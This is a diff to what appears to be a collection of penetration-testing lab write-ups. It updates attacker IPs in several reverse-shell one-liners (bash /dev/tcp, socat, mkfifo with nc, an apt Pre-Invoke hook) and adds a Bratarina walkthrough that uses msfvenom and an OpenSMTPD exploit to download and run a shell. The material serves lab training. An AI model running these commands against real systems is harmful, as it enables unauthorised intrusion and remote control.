@@ -1510,7 +1510,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.85 seconds
 
 3. Found jpeg and png file upload at port 80. Create jpeg file by adding **FF D8 FF E0** header using hexeditor. 
 
-4. Create payload as per ImageMagick version 6.9.6-4 exploit. 
+4. Create payload as per ImageMagick version 6.9.6-4 exploit. https://github.com/overgrowncarrot1/ImageTragick_CVE-2023-34152
 ```
 https://github.com/ImageMagick/ImageMagick/issues/6339
 
@@ -2008,7 +2008,7 @@ http://192.168.109.128/uploads/upload_1627661999.zip
 
 http://192.168.109.128/index.php?file=zip://uploads/upload_1713347794.zip%23exploit&cmd=whoami
 
-bash -c 'bash -i >& /dev/tcp/192.168.45.202/1234 0>&1'
+bash -c 'bash -i >& /dev/tcp/192.168.45.241/1234 0>&1'
 
 cat /etc/crontab
 
@@ -2296,7 +2296,7 @@ WantedBy=multi-user.target
 
 [cmeeks@hetemit ~]$ cat <<'EOT'> /home/cmeeks/reverse.sh
 #!/bin/bash
-socat TCP:192.168.118.8:18000 EXEC:sh
+socat TCP:192.168.45.207:18000 EXEC:sh
 EOT
 
 [cmeeks@hetemit ~]$ chmod +x /home/cmeeks/reverse.sh
@@ -2607,7 +2607,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 2. Enter this command for reverse shell and use penelope.py for better shell. 
 ```
-id | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.156 8000 >/tmp/f
+id | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.241 8000 >/tmp/f
 
 ./penelope.py 8000  
 ```
@@ -2665,7 +2665,7 @@ uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
 ```
 * * * * * root apt-get update
 
-franklin@flimsy:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke{"rm /tmp/f;mkfifo /tmp/f;c -i 2>&1|nc 192.168.45.156 8000 >/tmp/f"};' > shell
+franklin@flimsy:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.207 80 >/tmp/f"};' > shell
 ```
 
 4. Obtained reverse shell. 
@@ -3153,4 +3153,36 @@ su root2
 Password: w00t
 
 root@banzai:/# 
+```
+
+## Bratarina
+
+1. Port scan 
+```
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
+|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
+|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
+25/tcp  open  smtp        OpenSMTPD
+| smtp-commands: bratarina Hello auth [192.168.45.207], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
+|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
+80/tcp  open  http        nginx 1.14.0 (Ubuntu)
+|_http-title:         Page not found - FlaskBB        
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
+Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Found the exploit for opensmpt so use it to run. Rooted
+```
+kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.49.135 LPORT=445
+
+python3 47984.py 192.168.135.71 25 'wget 192.168.49.135/shell -O /tmp/shell'
+
+python3 47984.py 192.168.135.71 25 '/tmp/shell'
+
+sudo nc -lvnp 445
+rooted
 ```
